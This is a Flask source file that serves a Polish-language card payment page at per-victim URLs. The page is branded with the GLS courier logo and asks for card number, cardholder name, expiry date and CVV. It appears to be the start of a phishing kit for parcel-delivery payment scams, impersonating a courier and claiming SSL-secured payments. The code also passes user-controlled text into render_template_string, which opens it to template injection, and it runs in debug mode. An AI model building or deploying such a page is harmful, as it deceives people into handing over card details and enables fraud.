from flask import Flask, render_template_string, request
import uuid

app = Flask(__name__)

@app.route('/payment/<unique_id>', methods=['GET'])
def payment(unique_id):
    # Здесь вы можете изменить текст в зависимости от уникального ID
    description = descriptions.get(unique_id, "Proszę wprowadzić dane karty, aby zakończyć transakcję.")
    
    html_content = f"""
    <!DOCTYPE html>
    <html lang="pl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Płatność kartą</title>
        <style>
            body {{ font-family: 'Arial', sans-serif; background-color: #f4f7fa; margin: 0; padding: 20px; }}
            .header {{ background-color: #007bff; color: white; padding: 10px 0; text-align: center; }}
            .container {{ max-width: 500px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1); }}
            h1 {{ text-align: center; color: #343a40; }}
            p {{ text-align: center; color: #6c757d; margin-bottom: 20px; }}
            .card-input {{ margin-bottom: 15px; }}
            label {{ display: block; margin-bottom: 5px; font-weight: bold; color: #495057; }}
            input[type="text"], input[type="number"], input[type="submit"] {{ width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 5px; font-size: 16px; }}
            input[type="submit"] {{ background-color: #28a745; color: white; border: none; cursor: pointer; }}
            input[type="submit"]:hover {{ background-color: #218838; }}
            .logos {{ text-align: center; margin-top: 20px; }}
            .logos img {{ width: 60px; margin: 0 15px; }}
            .footer {{ text-align: center; margin-top: 20px; font-size: 12px; color: #6c757d; }}
        </style>
    </head>
    <body>

    <div class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/GLS_Logo.svg/1200px-GLS_Logo.svg.png" alt="GLS Logo" style="height: 50px;">
    </div>

    <div class="container">
        <h1>Płatność kartą</h1>
        <p>{description}</p>
        
        <form>
            <div class="card-input">
                <label for="card-number">Numer karty (16 cyfr)</label>
                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required maxlength="19">
            </div>
            
            <div class="card-input">
                <label for="cardholder-name">Imię i nazwisko posiadacza karty</label>
                <input type="text" id="cardholder-name" placeholder="Jan Kowalski" required>
            </div>

            <div class="card-input">
                <label for="expiry-date">Data ważności (MM/RR)</label>
                <input type="text" id="expiry-date" placeholder="MM/RR" required pattern="d{2}/d{2}">
            </div>

            <div class="card-input">
                <label for="cvv">CVV (3 cyfry)</label>
                <input type="number" id="cvv" placeholder="123" required pattern="d{3}">
            </div>

            <input type="submit" value="Zapłać">
        </form>

        <div class="logos">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.svg" alt="Visa">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/27/MasterCard_Logo.svg" alt="Mastercard">
			</div>
		<div class="footer">
            <p>Bezpieczne płatności dzięki SSL</p>
            <p>© 2023 Twoja Firma. Wszelkie prawa zastrzeżone.</p>
        </div>
    </div>

    </body>
    </html>
    """
    
    return render_template_string(html_content)

if __name__ == '__main__':
    global descriptions
    descriptions = {}
    app.run(debug=True)